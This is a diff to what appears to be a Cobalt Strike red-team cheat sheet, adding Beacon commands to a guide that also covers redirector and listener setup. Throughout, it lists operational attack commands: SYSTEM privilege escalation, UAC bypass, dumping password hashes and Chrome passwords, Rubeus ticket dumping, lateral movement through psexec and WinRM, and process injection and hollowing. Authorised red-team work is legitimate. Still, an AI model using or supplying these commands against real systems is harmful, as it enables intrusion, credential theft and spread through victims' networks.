@@ -51,7 +51,7 @@ Create 3 free Ubuntu instances in AWS. These instances will be used for the foll
 Install socat on each instance: sudo apt install socat
 ------------------------------------------------------------------------------------------------------------------------------------------------------
 
-# Valid SSL Certificate for Beacon 
+# Valid SSL certificate for Beacon 
 
 Create a Java Keystore file. Use the fully qualified domain name of your Beacon server.
 keytool -genkey -keyalg RSA -keysize 2048 -keystore domain.store
@@ -69,7 +69,7 @@ keytool -import -trustcacerts -alias mykey -file domain.crt -keystore domain.sto
 Cobalt Strike expects to find the Java Keystore file in the same folder as your Malleable C2 profile.
 ------------------------------------------------------------------------------------------------------------------------------------------------------
 
-# Create Listeners
+# Create listeners
 
 Cobalt Strike > Listeners > Add
 Name: HTTP
@@ -270,6 +270,9 @@ psinject <PID> <arch> <cmdlet> <args>             Injects UnmanagedPowerShell in
 
 # Privilege Escalation
 
+getsystem                                         SYSTEM account impersonation using named pipes
+elevate svc-exe [listener] (creates a service that runs a payload as SYSTEM)
+
 powershell-import /opt/PowerSploit/Privesc/PowerUp.ps1
 powershell Invoke-PrivescAudit
 
@@ -324,7 +327,16 @@ bypassuac http
 john should now be running in a high integrity Beacon (see asterisk)
 ------------------------------------------------------------------------------------------------------------------------------------------------------
 
+# Transfer files
+
+download <path to file>
+upload <path to file>
+------------------------------------------------------------------------------------------------------------------------------------------------------
+
 # Credential Abuse
+
+hashdump
+chromedump                                        Recover Google Chrome passwords from the current user
 
 make_token DOMAIN\user password
 
@@ -344,9 +356,22 @@ execute-assembly /opt/Seatbelt.exe -q SecPackageCreds
 execute-assembly /opt/Rubeus.exe dump
 ------------------------------------------------------------------------------------------------------------------------------------------------------
 
-# Lateral Movement
+# Lateral movement
 
 Always use a FQDN instead of an IP.
+
+jump psexec                                       Run service EXE on remote host
+jump psexec_psh                                   Run a PowerShell one-liner on remote host via a service
+jump winrm                                        Run a PowerShell script via WinRM on remote host
+remote-exec <any of the above>                    Run a single command using the above methods on remote host
+------------------------------------------------------------------------------------------------------------------------------------------------------
+
+# Process injection
+
+inject <pid>
+dllinject <pid>                                   Reflective DLL injection
+dllload <pid>                                     Loading an on-disk DLL to memory
+spawnto <arch> <full-exe-path>                    Process hollowing
 ------------------------------------------------------------------------------------------------------------------------------------------------------
 
 upload /tmp/beacon.dll
